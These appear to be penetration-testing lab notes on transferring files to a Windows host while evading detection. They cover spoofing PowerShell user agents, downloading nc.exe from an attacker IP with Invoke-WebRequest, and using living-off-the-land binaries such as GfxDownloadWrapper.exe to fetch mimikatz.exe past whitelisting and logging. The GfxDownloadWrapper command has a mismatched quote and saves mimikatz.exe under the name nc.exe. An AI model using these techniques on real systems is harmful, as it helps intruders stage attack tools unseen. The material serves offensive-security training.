If  administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a User Agent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.

```powershell
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0
```

Invoking `Invoke-WebRequest` to download `nc.exe` using a Chrome User Agent:
#### Request with Chrome User Agent
We set `chrome` User agent and then run the command.
```powershell
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

try `nc` or any other like `Python` server.
```shell
[!bash!]$ nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

## LOLBAS / GTFOBins

Application white listing may prevent you from using `powershell` or `netcat` and `command line` logging may alert defenders to your presence. So you can use `LolBins living of the land binary` also know as `mislead trust binaries`. 

such as `LOLBIN` in intel graphic driver for window 10 `GfxDownloadWrapper.exe` installed on sys and functionality to download configuration files.
Access the website and search for `/upload` and `/download` to get specific `binaries`.
#### Transferring File with GfxDownloadWrapper.exe

```powershell
GfxDownloadWrapper.exe 'https://10.10.10.35/mimikatz.exe 'C:\Temp\nc.exe'
```

This binary might permitted to generate alert so its worth checking  [LOLBAS](https://lolbas-project.github.io/) project to find a suitable `file download` binary that exists in your environment. 
Linux's equivalent is the [GTFOBins](https://gtfobins.github.io/) project and is definitely also worth checking out. `GTFOBins` provide 40 commonly installed binaries for file transfer.

